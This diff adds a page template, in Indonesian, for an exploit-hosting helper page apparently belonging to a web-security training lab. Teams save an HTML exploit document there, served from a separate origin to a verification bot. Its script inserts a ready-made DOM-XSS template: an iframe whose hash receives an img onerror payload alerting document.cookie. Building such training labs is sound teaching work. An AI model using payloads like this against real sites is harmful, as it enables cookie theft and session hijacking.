@@ -1,0 +1,131 @@
+<%- include('partials/header', { title: 'Challenge Helper Page - Exploit Server', currentLab: 'helper' }) %>
+
+<div class="lab-banner">
+  <div class="lab-meta">
+    <span class="lab-pill">Exploit Server</span>
+    <span>Cross-Origin Delivery</span>
+  </div>
+  <h1 class="lab-title">Challenge Helper Page</h1>
+  <p class="lab-description">
+    Halaman ini berfungsi sebagai server pembantu pihak ketiga (origin terpisah) tempat peserta dapat menyimpan satu dokumen HTML
+    eksploitasi. Dokumen ini disajikan dengan URL tetap dan dapat dikirimkan ke bot verifikasi atau diuji langsung dari browser.
+  </p>
+</div>
+
+<% if (saved && teamId) { %>
+  <div class="card" style="border-left: 4px solid var(--success-color); background-color: #f0fdf4;">
+    <h3 style="color: #166534; margin-bottom: 0.5rem;">Dokumen HTML Berhasil Disimpan!</h3>
+    <p style="color: #15803d; font-size: 0.95rem; margin-bottom: 0.75rem;">
+      Dokumen tim Anda telah aktif dan dapat diakses publik melalui URL tetap berikut:
+    </p>
+    <div style="display: flex; gap: 0.75rem; align-items: center; flex-wrap: wrap;">
+      <code style="background: #ffffff; padding: 0.5rem 0.85rem; border: 1px solid #bbf7d0; border-radius: var(--radius-sm); font-size: 1rem; color: #14532d; font-weight: 600;">
+        <%= helperHost %>/helper/<%= teamId %>
+      </code>
+      <a href="<%= helperHost %>/helper/<%= teamId %>" target="_blank" class="btn btn-primary" style="font-size: 0.85rem; padding: 0.4rem 0.85rem;">
+        Buka Exploit &nearr;
+      </a>
+    </div>
+  </div>
+<% } %>
+
+<% if (error) { %>
+  <div class="card" style="border-left: 4px solid var(--danger-color); background-color: #fef2f2;">
+    <h3 style="color: #991b1b; margin-bottom: 0.25rem;">Gagal Menyimpan</h3>
+    <p style="color: #b91c1c; font-size: 0.9rem;">
+      <% if (error === 'size_exceeded') { %>
+        Ukuran dokumen melebihi batas maksimum 10 KB.
+      <% } else if (error === 'invalid_team_id') { %>
+        Format Team ID tidak valid (hanya alfanumerik, -, dan _ maksimum 32 karakter).
+      <% } else { %>
+        Terjadi kesalahan saat menyimpan dokumen.
+      <% } %>
+    </p>
+  </div>
+<% } %>
+
+<div class="card">
+  <h3 class="card-title">Simpan Dokumen HTML Tim</h3>
+
+  <form action="<%= helperHost %>/helper/save" method="POST">
+    <div class="form-group">
+      <label for="teamId" class="form-label">Team ID / Identifier</label>
+      <input 
+        type="text" 
+        id="teamId" 
+        name="teamId" 
+        value="<%= teamId %>" 
+        class="form-input" 
+        placeholder="e.g. team1, attacker42" 
+        required 
+        pattern="[a-zA-Z0-9_-]{1,32}"
+        maxlength="32"
+      >
+      <small style="color: var(--text-muted); font-size: 0.8rem;">
+        Hanya huruf, angka, tanda strip (-), atau underscore (_). Maksimum 32 karakter.
+      </small>
+    </div>
+
+    <div class="form-group">
+      <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.4rem;">
+        <label for="htmlContent" class="form-label" style="margin-bottom: 0;">HTML Document (Maks 10 KB)</label>
+        <div style="display: flex; gap: 0.5rem;">
+          <button type="button" class="btn btn-secondary" style="font-size: 0.75rem; padding: 0.2rem 0.5rem;" onclick="insertLab06Template()">
+            Isi Template Lab 06
+          </button>
+        </div>
+      </div>
+
+      <textarea 
+        id="htmlContent" 
+        name="htmlContent" 
+        class="form-textarea" 
+        rows="14" 
+        style="font-family: Consolas, monospace; font-size: 0.9rem;"
+        placeholder="Tulis kode HTML lengkap Anda di sini... (e.g. &lt;iframe src=...&gt;&lt;/iframe&gt;)" 
+        required
+      ><%= existingContent %></textarea>
+      
+      <div style="display: flex; justify-content: space-between; margin-top: 0.4rem; font-size: 0.8rem; color: var(--text-muted);">
+        <span>Disajikan dengan header <code>Content-Type: text/html</code> dari origin terpisah.</span>
+        <span id="byteCounter">0 / 10240 bytes</span>
+      </div>
+    </div>
+
+    <button type="submit" class="btn btn-primary">Simpan & Publikasikan Dokumen</button>
+  </form>
+</div>
+
+<script>
+  function updateByteCount() {
+    var text = document.getElementById('htmlContent').value;
+    var bytes = new TextEncoder().encode(text).length;
+    var counter = document.getElementById('byteCounter');
+    counter.textContent = bytes + ' / 10240 bytes';
+    if (bytes > 10240) {
+      counter.style.color = '#ef4444';
+      counter.style.fontWeight = 'bold';
+    } else {
+      counter.style.color = 'var(--text-muted)';
+      counter.style.fontWeight = 'normal';
+    }
+  }
+
+  function insertLab06Template() {
+    var labUrl = "<%= labHost %>/lab06";
+    var template = '<!DOCTYPE html>\n<html>\n<head>\n  <title>Lab 06 Exploit</title>\n</head>\n<body>\n' +
+      '  <h3>Exploit Delivery for Lab 06</h3>\n' +
+      '  <iframe src="' + labUrl + '#"\n' +
+      '          onload="this.src += \'<img src=x onerror=alert(document.cookie)>\'"\n' +
+      '          style="width: 100%; height: 500px; border: 1px solid #ccc;">\n' +
+      '  </iframe>\n' +
+      '</body>\n</html>';
+    document.getElementById('htmlContent').value = template;
+    updateByteCount();
+  }
+
+  document.getElementById('htmlContent').addEventListener('input', updateByteCount);
+  window.addEventListener('DOMContentLoaded', updateByteCount);
+</script>
+
+<%- include('partials/footer') %>
